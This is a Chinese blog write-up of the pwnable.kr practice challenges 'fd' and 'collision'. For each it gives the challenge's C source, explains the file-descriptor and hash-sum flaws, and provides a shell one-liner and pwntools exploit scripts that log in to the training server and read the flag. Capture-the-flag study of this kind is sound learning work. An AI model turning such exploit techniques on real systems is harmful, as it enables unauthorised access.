<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>pwnable.kr(1-2) · null</title><meta name="description" content="pwnable.kr(1-2)fd第一题ssh连接之后给出如下代码：
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
char buf[32];
int main(int argc, char*"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/"></a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"><li><a href="https://twitter.com/www.baidu.com"><i class="fa fa-twitter"></i></a></li><li><a href="http://weibo.com/www.baidu.com"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>pwnable.kr(1-2)</a></h3></div><div class="post-content"><h1 id="pwnable-kr-1-2"><a href="#pwnable-kr-1-2" class="headerlink" title="pwnable.kr(1-2)"></a>pwnable.kr(1-2)</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>第一题ssh连接之后给出如下代码：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
char buf[32];
int main(int argc, char* argv[], char* envp[]){
//argc是命令行参数个数(必为int类型)，char*argv[]是指所有命令行参数，char *envp[]是环境变量
//argv参数是字符串指针数组，其各元素值为命令行中各字符串的首地址，指针数组的长度即为参数个数

    if(argc&lt;2){
        printf(&quot;pass argv[1] a number\n&quot;);
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    //atoi函数将字符串转化成整形
    //fd文件描述符，只是一个整数
    int len = 0;
    len = read(fd, buf, 32);
    /*read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。
    返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动*/
    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
        printf(&quot;good job :)\n&quot;);
        system(&quot;/bin/cat flag&quot;);
        exit(0);
    }
    printf(&quot;learn about Linux file IO\n&quot;);
    return 0;

}
</code></pre><p>这题的重点在题目中也提示了-&gt;<strong>fd</strong><br>通过查阅资料了解到fd就是File descripter也就是文件描述符，维基上有如下解释：In Unix and related computer operating systems, a file descriptor (FD, less frequently fildes) is an abstract indicator (handle) used to access a file or other input/output resource, such as a pipe or network socket.<br>所以<strong>fd</strong>是在UNIX及其相关联系统上才有的，<strong>fd</strong>为一个非负整数，他的0，1，2代表了不同的含义<br><img src="https://i.imgur.com/dnzdPFz.png" alt=""></p>
<p>回到原题，关键要满足：<code>buf=LETMEWIN</code>，所以要输入<strong>LETMEWIN</strong>就要使<code>int fd = atoi( argv[1] ) - 0x1234;</code>中的fd为0，因为0x1234=4660(int)，因此在终端输入<strong>./fd 4660</strong>然后再写入<strong>LETMEWIN</strong>即可<br>再给出一个exp：</p>
<pre><code>from pwn import *
pwn_ssh=ssh(host=&apos;pwnable.kr&apos;,user=&apos;fd&apos;,password=&apos;guest&apos;,port=2222)
print (pwn_ssh.connected())
sh=pwn_ssh.process(argv=[&apos;fd&apos;,&apos;4660&apos;],executable=&apos;./fd&apos;)
sh.sendline(&quot;LETMEWIN&quot;)
print (sh.recvall())
</code></pre><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>老规矩查看代码：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i&lt;5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
/*前者可接受 命令行参数，argc表示参数个数， argv[]是参数数组,其中第0个参数是程序本身的名称（包含路径）。
argv[]是一个字符数组.
argv[0]:指向程序的全路径名
argv[1]:指向在DOS命令行中执行程序名后的第一个字符串。
argv[2]:指向第二个字符串。
*/

    if(argc&lt;2){
        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf(&quot;passcode length should be 20 bytes\n&quot;);
        return 0;
    }

//
//参数至少两个，hashcode=input
    if(hashcode == check_password( argv[1] )){
        system(&quot;/bin/cat flag&quot;);
        return 0;
    }
    else
        printf(&quot;wrong passcode.\n&quot;);
    return 0;
}
</code></pre><p>思路很明显：输入参数20个字节，最后res的值在5次循环相加之后要满足等于0x21DD09EC，还要说明的一点是int占4个字节，char占1个字节，因此<code>int* ip = (int*)p;</code>这里就将passcode分成了有5个参数的数组，所以随便输入一个<code>hex(0x21DD09EC-0x01020304*4)</code>得到0x1dd4fddc，于是在终端输入<br> <code>./col $(python -c &#39;print &quot;\xdc\xfd\xd4\x1d&quot;+4*&quot;\x04\x03\x02\x01&quot;&#39;)</code><br>最终得到答案<br>有一点要说的是<strong>python -c</strong>，python给出的解释是：</p>
<blockquote>
<p>-c cmd : program passed in as string (terminates option list)</p>
</blockquote>
<p>给出exp：</p>
<pre><code>from pwn import *
import os

pwn_ssh=ssh(host=&apos;pwnable.kr&apos;,user=&apos;col&apos;,password=&apos;guest&apos;,port=2222)
print (pwn_ssh.connected())

sh=pwn_ssh.process(argv=[&apos;collision&apos;,&apos;\xfc\x01\xf9\x39&apos; * 5],executable=&apos;./col&apos;)
print (sh.recvall())
</code></pre></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2018-09-08</span><i class="fa fa-tag"></i><a class="tag" href="/tags/pwn/" title="pwn">pwn </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2018/09/08/pwn/pwnable1/,null,pwnable.kr(1-2),;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2018/09/11/vulnerable/jinja2/" title="由Musee de X(强网杯2017)到jinja2模板注入">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2018/07/19/web/编码与解码/" title="关于编码与解码的思考">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>